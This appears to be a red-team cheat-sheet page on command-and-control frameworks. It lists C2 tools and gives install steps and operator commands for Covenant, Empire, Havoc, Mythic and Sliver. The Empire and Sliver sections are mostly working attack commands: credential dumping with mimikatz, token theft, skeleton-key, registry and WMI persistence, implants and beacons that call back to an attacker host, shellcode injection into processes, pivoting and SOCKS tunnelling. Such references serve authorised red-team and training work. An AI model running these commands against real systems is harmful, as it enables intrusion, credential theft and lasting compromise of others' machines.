# Command and Control

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Resources)

## Table of Contents

- [Covenant](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Covenant)
- [Empire](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Empire)
- [Hak5 Cloud C2](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Hak5-Cloud-C2)
- [Havoc](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Havoc)
- [Mythic](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Mythic)
- [Sliver](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Sliver)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AzureC2Relay | AzureC2Relay is an Azure Function that validates and relays Cobalt Strike beacon traffic by verifying the incoming requests based on a Cobalt Strike Malleable C2 profile. | https://github.com/Flangvik/AzureC2Relay |
| Brute Ratel | A Customized Command and Control Center for Red Team and Adversary Simulation | https://bruteratel.com/ |
| Cobalt Strike | Adversary Simulation and Red Team Operations | https://www.cobaltstrike.com/ |
| Covenant | Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers. | https://github.com/cobbr/Covenant |
| DeathStar | DeathStar is a Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs. | https://github.com/byt3bl33d3r/DeathStar |
| Empire | Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. | https://github.com/BC-SECURITY/Empire |
| Hardhat C2 | A c# Command & Control framework | https://github.com/DragoQCC/HardHatC2 |
| Havoc | The Havoc Framework | https://github.com/HavocFramework/Havoc |
| KillDefenderBOF | Beacon Object File PoC implementation of KillDefender | https://github.com/Cerbersec/KillDefenderBOF |
| Merlin | Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang. | https://github.com/Ne0nd0g/merlin |
| MoveKit | Cobalt Strike kit for Lateral Movement | https://github.com/0xthirteen/MoveKit |
| Mythic | A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming. | https://github.com/its-a-feature/Mythic |
| Nightmangle | Nightmangle is post-exploitation Telegram Command and Control (C2/C&C) Agent, created by @1N73LL1G3NC3. | https://github.com/1N73LL1G3NC3x/Nightmangle |
| NimPlant | A light-weight first-stage C2 implant written in Nim. | https://github.com/chvancooten/NimPlant |
| Nuages | A modular C2 framework | https://github.com/p3nt4/Nuages |
| PoshC2 | A proxy aware C2 framework used to aid red teamers with post-exploitation and lateral movement. | https://github.com/nettitude/PoshC2 |
| REC2 (Rusty External C2) | REC2 (Rusty External Command and Control) is client and server tool allowing auditor to execute command from VirusTotal and Mastodon APIs written in Rust. 🦀 | https://github.com/g0h4n/REC2 |
| RedWarden | Cobalt Strike C2 Reverse proxy that fends off Blue Teams, AVs, EDRs, scanners through packet inspection and malleable profile correlation | https://github.com/mgeeky/RedWarden |
| SharpC2 | Command and Control Framework written in C# | https://github.com/rasta-mouse/SharpC2 |
| SILENTTRINITY | An asynchronous, collaborative post-exploitation agent powered by Python and .NET's DLR | https://github.com/byt3bl33d3r/SILENTTRINITY |
| Sliver | Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. | https://github.com/BishopFox/sliver |
| SharpLAPS | Retrieve LAPS password from LDAP | https://github.com/swisskyrepo/SharpLAPS |
| SPAWN | Cobalt Strike BOF that spawns a sacrificial process, injects it with shellcode, and executes payload. Built to evade EDR/UserLand hooks by spawning sacrificial process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing. | https://github.com/boku7/SPAWN |
| Villain | Villain is a C2 framework that can handle multiple TCP socket & HoaxShell-based reverse shells, enhance their functionality with additional features (commands, utilities etc) and share them among connected sibling servers (Villain instances running on different machines). | https://github.com/t3l3machus/Villain |

## Covenant

> https://github.com/cobbr/Covenant

> https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

### Prerequisites

```c
$ sudo apt-get install docker docker-compose
```

### Installation

```c
$ git clone --recurse-submodules https://github.com/cobbr/Covenant
$ cd Covenant/Covenant
$ docker build -t covenant .
```

```c
$ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
```

> https://127.0.0.1:7443/covenantuser/login

### Stop Covenant

```c
$ docker stop covenant
```

### Restart Covenant

```c
$ docker start covenant -ai
```

### Remove and Restart Covenant

```c
$ ~/Covenant/Covenant > docker rm covenant
$ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
```

## Empire

> https://github.com/BC-SECURITY/Empire

### Installation

```c
$ git clone --recursive https://github.com/BC-SECURITY/Empire.git
$ cd Empire
$ ./setup/checkout-latest-tag.sh
$ ./setup/install.sh
```

```c
$ ./ps-empire server
```

```c
./ps-empire client
```

### Starkiller

> http://127.0.0.1:1337/index.html

### Common Commands

```c
(Empire) > listeners                      // list current running listeners
(Empire) > uselistener                    // configure listener
(Empire) > agents                         // list available agents
(Empire) > kill <NAME>                    // kill a specific agent
(Empire: listeners/http) > info           // provide information about used listener or module
(Empire: listeners/http) > back           // get back from current menu
(Empire: listeners) > usestager           // creating payloads
(Empire: agents) > rename <NAME> <NAME>   // renaming specific agent
(Empire: agents) > interact <NAME>        // interacting with specific agent
(Empire: agents) > searchmodule <NAME>    // search for a specific module
(Empire: <NAME>) > usemodule <NAME>       // use a specific module
(Empire: <NAME>) > sysinfo                // show system information
(Empire: <NAME>) > creds                  // show credentials
(Empire: <NAME>) > download               // download files
(Empire: <NAME>) > upload                 // upload files
(Empire: <NAME>) > sleep <60>             // set agent communication to sleep for 60 seconds
(Empire: <NAME>) > steal_token            // impersonate access token
(Empire: <NAME>) > shell [cmd]            // open a shell with cmd.exe
(Empire: <NAME>) > ps                     // show running processes
(Empire: <NAME>) > psinject               // inject agent to another process
(Empire: <NAME>) > scriptimport           // load powershell script
(Empire: <NAME>) > mimikatz               // executes sekurlsa::logonpasswords
(Empire: <NAME>) > usemodule privesc/getsystem            // try privilege escalation
(Empire: <NAME>) > usemodule privesc/sherlock             // run sherlock
(Empire: <NAME>) > usemodule privesc/powerup/allchecks    // perform privilege escalation checks
(Empire: <NAME>) > usemodule situational_awareness/host/antivirusproduct    // provides information about antivirus products
(Empire: <NAME>) > usemodule situational_awareness/host/applockerstatus     // provides information about applocker status
(Empire: <NAME>) > usemodule situational_awareness/host/computerdetails     // provides information about event ids 4648 (RDP) and 4624 (successful logon)
(Empire: <NAME>) > situational_awareness/network/get_spn                       // provides information about spns
(Empire: <NAME>) > situational_awareness/network/powerview/get_domain_trust    // show information about domain trusts
(Empire: <NAME>) > situational_awareness/network/powerview/map_domain_trust    // map information about domain trust
(Empire: <NAME>) > situational_awareness/network/bloodhound3                   // load bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > set CollectionMethodAll    // configure bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > run                        // run the module
(Empire: <NAME>) > download *bloodhound*                                                // download the module
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry    // registry persistence
(Empire: <NAME>) > usemodule persistence/misc/add_sid_history            // sid history persistence
(Empire: <NAME>) > usemodule persistence/misc/memssp                     // ssp persistence
(Empire: <NAME>) > usemodule persistence/misc/skeleton_key               // skeleton key persistence
(Empire: <NAME>) > usemodule persistence/elevated/wmi                    // wmi persistence
```

### Setup HTTP Listener

```c
(Empire) > listeners http
(Empire: listeners/http) > info
(Empire: listeners/http) > set Name <NAME>
(Empire: listeners/http) > set Host <LHOST>
(Empire: listeners/http) > set Port <PORT>
(Empire: listeners/http) > exeute
```

### Setup Stager

```c
(Empire: listeners) > usestager multi/bash
(Empire: listeners/multi/bash) > set Listener <NAME>
(Empire: listeners/multi/bash) > set OutFile /PATH/TO/FILE/<FILE>.sh
(Empire: listeners/multi/bash) > execute
```

### Setup Persistence Measures

```c
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
(Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
(Empire: <NAME>/powershell/persistence/elevated/registry) > run
```

## Hak5 Cloud C2

```c
$ ./c2-3.3.0_amd64_linux -hostname 127.0.0.1 -listenip 127.0.0.1
```

> http://127.0.0.1:8080

## Havoc

> https://github.com/HavocFramework/Havoc

### Python Environment

```c
$ sudo apt-get install build-essential
$ sudo add-apt-repository ppa:deadsnakes/ppa
$ sudo apt-get update
$ sudo apt-get install python3.10 python3.10-dev
```

### Prerequisites

```c
$ sudo apt-get install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm
```

### Installation

#### Building Client

```c
user@host:/opt$ sudo git clone https://github.com/HavocFramework/Havoc.git
user@host:/opt$ cd Havoc/Client
user@host:/opt/Havoc/Client$ make 
user@host:/opt/Havoc/Client$ ./Havoc
```

#### Building Teamserver

```c
user@host:/opt/Havoc/Teamserver$ go mod download golang.org/x/sys
user@host:/opt/Havoc/Teamserver$ go mod download github.com/ugorji/go
user@host:/opt/Havoc/Teamserver$ ./Install.sh
user@host:/opt/Havoc/Teamserver$ make
user@host:/opt/Havoc/Teamserver$ ./teamserver -h
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Teamserver

```c
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Client

```c
user@host:/opt/Havoc/Client$ ./Havoc
```

## Mythic

> https://github.com/its-a-feature/Mythic

> https://docs.mythic-c2.net/

> https://github.com/MythicAgents

> https://github.com/MythicC2Profiles

### Installation

```c
$ sudo apt-get install build-essential ca-certificates curl docker.io docker-compose gnupg gpg mingw-w64 g++-mingw-w64 python3-docker
$ git clone https://github.com/its-a-feature/Mythic.git
$ cd Mythic/
$ sudo make
```

### Install HTTP C2 Profile

```c
$ sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

### Install Mythic Agents

```c
$ sudo ./mythic-cli install github https://github.com/MythicAgents/apfell.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/arachne.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Athena.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/freyja.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/hermes.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Medusa.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/merlin.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Nimplant.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon.git
```

### Finalize the Installation

Check the `.env` file to grab the credentials for the `mythic_admin` user.

```c
$ cat .env
```

> https://127.0.0.1:7443

## Sliver

> https://github.com/BishopFox/sliver

> https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2

> https://github.com/BishopFox/sliver/wiki/Beginner's-Guide

> https://github.com/BishopFox/sliver/wiki/Getting-Started

### Installation

```c
$ curl https://sliver.sh/install | sudo bash
```

### Quick Start

Download the latest `sliver-server` binary and execute it.

> https://github.com/BishopFox/sliver/releases

```c
$ ./sliver-server_linux 

Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.

Unpacking assets ...
[*] Loaded 20 aliases from disk
[*] Loaded 104 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain evolve
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options
```

```c
[server] sliver > multiplayer

[*] Multiplayer mode enabled!
```

```c
[server] sliver > generate --http <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/FOLDER/
```

```c
[server] sliver > http
```

### Administration

```c
sliver > version
sliver > players
sliver > armory
sliver > armory install all
```

### Multiplayer

#### Register a new Operator

```c
root@c2:~# ./sliver-server operator --name <USERNAME> --lhost 127.0.0.1 --save /home/<USERNAME>/.sliver/configs/<USERNAME>.cfg
```

```c
root@c2:~/.sliver/configs$ chown <USERNAME>:<USERNAME> *.cfg
```

```c
username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
```

#### Register a new Operator directly on the Sliver Server

```c
[server] sliver > multiplayer
```

```c
[server] sliver > new-operator --name <USERNAME> --lhost <LHOST>
```

```c
username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
```

#### Kick Operator

```c
[server] sliver > kick-operator -n <USERNAME>
```

### Implant and Beacon Creation 

```
sliver > help generate
sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
```

### Profile Handling

```c
sliver (STALE_PNEUMONIA) > profiles new --mtls <LHOST> --os windows --arch amd64 --format exe session_win_default
sliver (STALE_PNEUMONIA) > profiles generate --save /PATH/TO/BINARY session_win_default
sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format exe  --seconds 5 --jitter 3 beacon_win_default
sliver > profiles generate --save /PATH/TO/BINARY beacon_win_default
```

### Common Commands, Implant and Beacon Handling

```c
sliver > mtls                                                             // Mutual Transport Layer Security
sliver > mtls --lport <LPORT>                                             // Set MTLS port
sliver > jobs                                                             // display current jobs
sliver > implants                                                         // show all created implants
sliver > sessions                                                         // display currently available sessions
sliver > sessions -i <ID>                                                 // interact with a session
sliver > use -i <ID>                                                      // interact with a session
sliver > sessions -k <ID>                                                 // kill a session
sliver > upload //PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY     // upload a file
sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
sliver (NEARBY_LANGUAGE) > tasks fetch 49ead4a9                           // fetch a specific task
sliver (NEARBY_LANGUAGE) > info                                           // provide session information
sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell (ctrl + d to get back)
sliver (NEARBY_LANGUAGE) > netstat                                        // get network information
sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
sliver (NEARBY_LANGUAGE) > background                                     // background the session
sliver (NEARBY_LANGUAGE) > seatbelt -- -group=getsystem                   // execute from armory with parameter
sliver (NEARBY_LANGUAGE) > execute-assembly <FILE>.exe uac                // execute a local binary
sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // execute a local binary
```

### Spawning new Sessions

```c
sliver (NEARBY_LANGUAGE) > interactive
sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY
sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
```

### Port Forwarding

```c
sliver (NEARBY_LANGUAGE) > portfwd
sliver (NEARBY_LANGUAGE) > portfwd add -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add -b 127.0.0.1:<RPORT> -r 127.0.0.1:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add --bind 127.0.0.1:<RPORT> -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd rm -i <ID>
```

### SOCKS Proxy

```c
sliver (NEARBY_LANGUAGE) > socks5 start
sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
```

### Pivoting

```c
sliver (NEARBY_LANGUAGE) > pivots tcp
sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:9898
sliver (NEARBY_LANGUAGE) > pivots
```
